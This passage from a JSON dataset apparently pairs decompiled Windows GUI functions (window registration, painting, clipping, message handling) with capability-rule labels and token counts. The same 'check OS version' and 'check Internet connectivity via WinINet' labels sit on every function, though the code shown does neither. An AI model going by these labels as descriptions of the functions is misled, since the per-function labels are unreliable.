        "decompiled_code": "\nvoid __fastcall fcn.00453b38(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00453b18();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00453adc();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00453d64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00453d64(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x453f25;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x9c))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.00457a28();\n                goto code_r0x00453e10;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.004075f4();\n        fcn.0040daac(uVar5, arg_ch);\n        fcn.00404eb4();\n    }\ncode_r0x00453e10:\n    in_EAX[0x6a] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.0044c5e0)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.0044c5e0;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040f1e0();\n        }\n    }\n    *0x491634 = in_EAX;\n    (**(*in_EAX + 0xa0))();\n    if (in_EAX[0x6d] == 0) {\n        fcn.0040f1e0();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x6d], 0xfffffff4, in_EAX[0x6d]);\n        }\n    }\n    fcn.0040aaec();\n    in_EAX[0x19] = 0;\n    fcn.00457d40();\n    uVar5 = 1;\n    fcn.00423fb0();\n    fcn.00450f7c(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.0040483c();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.0040546c(0x453f2c);\n    return;\n}\n",
        "token_count": 910
    },
    "00454014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00454014(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (cVar1 = fcn.00454000(),  cVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x1cc);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.004197d8();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x4540f0 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = *(*(arg_8h + -8) + 0x1d0);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.004197d8();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x4540f0 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 382
    },
    "00454318": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454318(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *arg_8h;\n    uStack16 = arg_8h[1];\n    uStack12 = arg_8h[2];\n    uStack8 = arg_8h[3];\n    if (*(in_EAX + 0x232) != 0) {\n        (**(in_EAX + 0x230))(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "004543ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004543ac(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    if (in_EAX[0x6d] != 0) {\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                piVar1 = fcn.004197d8();\n                (**(*piVar1 + 0xb0))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iStack20 = in_EAX[0x6d];\n        uStack16 = (*(in_EAX + 0x55) & 0x20) != 0;\n        sub.user32.dll_EnumChildWindows(iStack20, fcn.00454368, &iStack20);\n        (**(*in_EAX + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "00454420": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454420(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        fcn.00450f7c(0);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "004544c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004544c4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if ((((*(in_EAX + 0x57) == '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x55) & 8) != 0)))) &&\n        (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 0x55) & 8) != 0 || ((*(in_EAX + 0x51) & 4) != 0)))))) ||\n       (((*(in_EAX + 0x15) & 8) != 0 || ((*(in_EAX + 7) & 8) != 0)))) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x6d] == 0) {\n            puStack28 = 0x45453e;\n            (**(*in_EAX + 0x98))();\n        }\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x454566;\n                fcn.004197d8();\n                puStack28 = 0x45456b;\n                fcn.004544c4();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x6d] != 0) && (*(in_EAX + 0x1da) != cVar1)) {\n        *(in_EAX + 0x1da) = cVar1;\n        uStack32 = 0x4545c0;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.00450f7c(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 553
    },
    "004545e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004545e8(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = in_EAX;\n    do {\n        iVar1 = *(iVar3 + 0x30);\n        if (iVar1 == 0) {\n            if ((*(in_EAX + 0x1c) & 8) == 0) {\n                cVar2 = fcn.004047cc();\n                if ((cVar2 != '\\0') || (*(iVar3 + 0x1c4) != 0)) {\n                    fcn.004544c4();\n                }\n            }\n            return;\n        }\n        iVar3 = iVar1;\n    } while (*(iVar1 + 0x1da) != '\\0');\n    *(in_EAX + 0x1da) = 0;\n    return;\n}\n",
        "token_count": 199
    },
    "00454638": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454638(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_4h;\n    \n    if ((in_EAX[0xc] == 0) && (param_2 != in_EAX[0x71])) {\n        if ((in_EAX[0x6d] == 0) || ((in_EAX[0x71] == 0 || (param_2 == 0)))) {\n            fcn.00458dc8();\n            uVar1 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            (**(*in_EAX + 0xb0))();\n            in_EAX[0x71] = param_2;\n            fcn.004545e8();\n            *in_FS_OFFSET = uVar1;\n            fcn.00458dc8();\n            return;\n        }\n        in_EAX[0x71] = param_2;\n        sub.user32.dll_SetParent();\n        if ((4 < **0x492734) && (**0x492aec == 2)) {\n            fcn.00450f7c(0);\n        }\n        fcn.004545e8();\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "00454794": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454794(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    uint lprc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418360();\n    *(arg_8h + -0xc) = var_ch;\n    *(arg_8h + -8) = var_8h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar2 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar2 == 0) {\n        bVar3 = false;\n    }\n    else if (((*(in_EAX + 7) & 0x10) == 0) || ((*(in_EAX + 0x57) == '\\0' && ((*(in_EAX + 0x51) & 4) != 0)))) {\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar1 = (**(*in_EAX + 0x50))();\n            if ((cVar1 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                var_4h = CONCAT22(*(arg_8h + -8), *(arg_8h + -0xc));\n                iVar2 = fcn.00450f7c(var_4h);\n                bVar3 = iVar2 != 0;\n                goto code_r0x00454850;\n            }\n        }\n        bVar3 = false;\n    }\n    else {\n        bVar3 = true;\n    }\ncode_r0x00454850:\n    if (bVar3) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 427
    },
    "00454860": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00454860(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uchar *puVar3;\n    uint arg_8h_00;\n    int32_t var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    var_14h = 0;\n    if (((arg_ch != '\\0') && (*(in_EAX + 0x1d0) != 0)) && (iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1,  -1 < iVar2)) {\n        do {\n            if (arg_8h != '\\0') {\n                arg_ch_00 = 1;\n                arg_8h_00 = 1;\n                fcn.004197d8();\n                var_14h = fcn.00454860(arg_8h_00, arg_ch_00);\n            }\n            if (var_14h == 0) {\n                puVar3 = &stack0xfffffffc;\n                fcn.004197d8();\n                cVar1 = fcn.00454794(puVar3);\n                if (cVar1 != '\\0') break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (((*(in_EAX + 0x1cc) != 0) && (var_14h == 0)) && (iVar2 = *(*(in_EAX + 0x1cc) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.004197d8();\n            cVar1 = fcn.00454794(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return var_14h;\n}\n",
        "token_count": 461
    },
    "00454a70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00454a70(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00457a28();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x4916f4 == 0) || (iVar1 = *0x4916f4,  in_EAX != *(*0x4916f4 + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        iVar1 = fcn.00454860(0, 0);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.00450f7c(*(param_2 + 8) - *(iVar1 + 0x40) & 0xffffU | *(param_2 + 10) - *(iVar1 + 0x44) << 0x10);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 260
    },
    "00455044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455044(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x1b4) == 0) {\n        fcn.00451328();\n    }\n    else {\n        if ((*param_2 == 0x7b) && (*(in_EAX + 0x30) != 0)) {\n            iVar1 = fcn.00450f7c(param_2[2]);\n            param_2[3] = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n        iVar1 = *param_2;\n        if (iVar1 - 0x132U < 7) {\n            iVar1 = sub.user32.dll_SendMessageA(param_2[2], iVar1 + 0xbc00, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 - 0xbd32U < 7) {\n            uVar2 = fcn.00423aa4();\n            sub.gdi32.dll_SetTextColor(param_2[1], uVar2);\n            fcn.00424824();\n            uVar2 = fcn.00423aa4();\n            sub.gdi32.dll_SetBkColor(param_2[1], uVar2);\n            iVar1 = fcn.00424860();\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 == *0x497c74) {\n            param_2[3] = in_EAX;\n        }\n        else {\n            iVar1 = sub.user32.dll_CallWindowProcA(*(in_EAX + 0x1a8), *(in_EAX + 0x1b4), iVar1, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        if (*param_2 == 0xc) {\n            fcn.0044f860(param_2[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 471
    },
    "00455180": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455180(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    uint uStack128;\n    uchar *puStack124;\n    int32_t iStack120;\n    int32_t iStack116;\n    uint *puStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    int32_t hdc;\n    uint nSavedDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    hdc = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (hdc == 0) {\n        puStack100 = &fcn.00455180::var_50h;\n        uStack104 = 0x4551aa;\n        uStack104 = fcn.00457a28();\n        puStack108 = 0x4551b0;\n        hdc = sub.user32.dll_BeginPaint();\n    }\n    puStack112 = 0x4552df;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x73] == 0) {\n        iStack120 = 0x4551db;\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xc4))();\n        iStack120 = 0x4552b6;\n        fcn.00455318();\n        *in_FS_OFFSET = iStack116;\n        puStack108 = 0x4552e6;\n        if (*(var_8h + 4) == 0) {\n            puStack112 = &fcn.00455180::var_50h;\n            iStack116 = 0x4552d8;\n            iStack116 = fcn.00457a28();\n            iStack120 = 0x4552de;\n            sub.user32.dll_EndPaint();\n        }\n        return;\n    }\n    iStack120 = hdc;\n    puStack124 = 0x4551e9;\n    puStack108 = &stack0xfffffffc;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack128 = 0x4552a2;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar4 = 2;\n    iVar3 = *(var_4h[0x73] + 8);\n    puStack124 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar3 + -1) {\n        do {\n            puStack124 = puVar1;\n            iVar2 = fcn.004197d8();\n            if ((((*(iVar2 + 0x57) != '\\0') && (((*(iVar2 + 0x1c) & 0x10) == 0 || ((*(iVar2 + 0x55) & 8) == 0)))) ||\n                (((*(iVar2 + 0x1c) & 0x10) != 0 && (((*(iVar2 + 0x55) & 8) == 0 && ((*(iVar2 + 0x51) & 4) == 0)))))) &&\n               ((*(iVar2 + 0x50) & 0x40) != 0)) {\n                iStack132 = hdc;\n                iVar4 = sub.gdi32.dll_ExcludeClipRect();\n                if (iVar4 == 1) break;\n            }\n            iVar3 = iVar3 + -1;\n            puVar1 = puStack124;\n        } while (iVar3 != 0);\n    }\n    if (iVar4 != 1) {\n        (**(*var_4h + 0xc4))();\n    }\n    *in_FS_OFFSET = iStack132;\n    puStack124 = 0x4552a9;\n    uStack128 = nSavedDC;\n    iStack132 = hdc;\n    sub.gdi32.dll_RestoreDC();\n    return;\n}\n",
        "token_count": 946
    },
    "00455318": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455318(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint *arg_8h;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint *puStack76;\n    uint lprc;\n    int32_t var_18h;\n    uint nSavedDC;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hDC;\n    int32_t var_4h;\n    \n    hDC = param_2;\n    var_4h = in_EAX;\n    if (((*(in_EAX + 0x1dc) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x20))();\n    }\n    if (*(var_4h + 0x1cc) != 0) {\n        var_ch = 0;\n        if (param_1 != 0) {\n            var_ch = fcn.00419834();\n            if (var_ch < 0) {\n                var_ch = 0;\n            }\n        }\n        var_10h = *(*(var_4h + 0x1cc) + 8);\n        if (var_ch < var_10h) {\n            do {\n                var_18h = fcn.004197d8();\n                if (((*(var_18h + 0x57) != '\\0') &&\n                    (((*(var_18h + 0x1c) & 0x10) == 0 || ((*(var_18h + 0x55) & 8) == 0)))) ||\n                   (((*(var_18h + 0x1c) & 0x10) != 0 &&\n                    (((*(var_18h + 0x55) & 8) == 0 && ((*(var_18h + 0x51) & 4) == 0)))))) {\n                    fcn.00418388(&fcn.00455318::lprc, *(var_18h + 0x44) + *(var_18h + 0x4c));\n                    puStack76 = 0x455435;\n                    iVar1 = sub.gdi32.dll_RectVisible();\n                    if (iVar1 != 0) {\n                        if ((*(var_4h + 0x54) & 0x80) != 0) {\n                            *(var_18h + 0x54) = *(var_18h + 0x54) | 0x80;\n                        }\n                        puStack76 = hDC;\n                        puStack80 = 0x455458;\n                        nSavedDC = sub.gdi32.dll_SaveDC();\n                        uStack84 = 0x4554c5;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        puStack80 = &stack0xfffffffc;\n                        fcn.0044e2d0();\n                        sub.gdi32.dll_IntersectClipRect(hDC, 0, 0, *(var_18h + 0x48), *(var_18h + 0x4c));\n                        uVar4 = 0;\n                        fcn.00450f7c(0);\n                        *in_FS_OFFSET = uVar4;\n                        sub.gdi32.dll_RestoreDC(hDC, nSavedDC, 0x4554cc);\n                        return;\n                    }\n                }\n                var_ch = var_ch + 1;\n            } while (var_ch < var_10h);\n        }\n    }\n    if ((*(var_4h + 0x1d0) != 0) && (iVar1 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        var_ch = 0;\n        do {\n            iVar2 = fcn.004197d8();\n            if (((*(iVar2 + 0x1d9) != '\\0') && ((*(iVar2 + 0x50) & 0x10) != 0)) &&\n               ((((*(iVar2 + 0x1c) & 0x10) == 0 && (*(iVar2 + 0x57) != '\\0')) ||\n                ((((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)) && ((*(iVar2 + 0x55) & 8) == 0)))))) {\n                fcn.00423aa4();\n                uVar4 = sub.gdi32.dll_CreateSolidBrush();\n                puStack76 = 0x45558e;\n                fcn.00418388(&fcn.00455318::lprc, *(iVar2 + 0x44) + *(iVar2 + 0x4c));\n                puStack76 = &fcn.00455318::lprc;\n                puStack80 = hDC;\n                uStack84 = 0x45559b;\n                sub.user32.dll_FrameRect();\n                uStack88 = 0x4555a1;\n                uStack84 = uVar4;\n                sub.gdi32.dll_DeleteObject();\n                uStack88 = 0x4555ab;\n                uStack88 = fcn.00423aa4();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush();\n                iVar2 = *(iVar2 + 0x44) + *(iVar2 + 0x4c) + 1;\n                arg_8h = &fcn.00455318::lprc;\n                uVar4 = uVar3;\n                fcn.00418388(arg_8h, iVar2);\n                sub.user32.dll_FrameRect(hDC, &fcn.00455318::lprc, arg_8h, iVar2, uVar4);\n                sub.gdi32.dll_DeleteObject(uVar3);\n            }\n            var_ch = var_ch + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 1399
    },
    "004556a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004556a8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t lprc;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint hdc;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    puStack48 = 0x4556ca;\n    hdc = in_EDX;\n    var_4h = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack52 = 0x4558e1;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044e2d0();\n    sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n    iVar5 = 0;\n    iVar4 = 0;\n    uVar2 = fcn.00457a28(0xffffffec);\n    uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n    if ((uVar3 & 0x200) == 0) {\n        uVar2 = fcn.00457a28(0xfffffff0);\n        uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n        if ((uVar3 & 0x800000) != 0) {\n            iVar4 = 3;\n            iVar5 = 0xa00f;\n        }\n    }\n    else {\n        iVar4 = 10;\n        iVar5 = 0x200f;\n    }\n    if (iVar4 == 10) {\n        fcn.00431640();\n        cVar1 = fcn.00431748();\n        if ((cVar1 != '\\0') && (((*(var_4h + 0x1c) & 0x10) == 0 || (cVar1 = fcn.004315e8(),  cVar1 == '\\0')))) {\n            sub.user32.dll_SetRect(&fcn.004556a8::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n            if ((*(var_4h + 0x52) & 2) == 0) {\n                *(var_4h + 0x50) = *(var_4h + 0x50) | *0x4558fc;\n                fcn.004555f8();\n                *(var_4h + 0x50) = ~*0x4558fc & *(var_4h + 0x50);\n            }\n            else {\n                fcn.004555f8();\n            }\n            fcn.0044e2d0();\n            sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n            goto code_r0x00455861;\n        }\n    }\n    if (iVar5 != 0) {\n        sub.user32.dll_SetRect(&fcn.004556a8::lprc, 0, 0, *(var_4h + 0x48), *(var_4h + 0x4c));\n        sub.user32.dll_DrawEdge(hdc, &fcn.004556a8::lprc, iVar4, iVar5);\n        fcn.0044e2d0();\n        sub.gdi32.dll_IntersectClipRect(hdc, 0, 0, var_14h - lprc, var_10h - var_18h);\n    }\ncode_r0x00455861:\n    fcn.00450f7c(0);\n    uVar2 = 0;\n    fcn.00450f7c(0);\n    if ((*(var_4h + 0x1d0) != 0) && (iVar4 = *(*(var_4h + 0x1d0) + 8),  -1 < iVar4 + -1)) {\n        do {\n            iVar5 = fcn.004197d8();\n            if (*(iVar5 + 0x57) != '\\0') {\n                uVar2 = *(iVar5 + 0x44);\n                fcn.004556a8(uVar2);\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x4558e8);\n    return;\n}\n",
        "token_count": 1134
    },
    "00455cc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
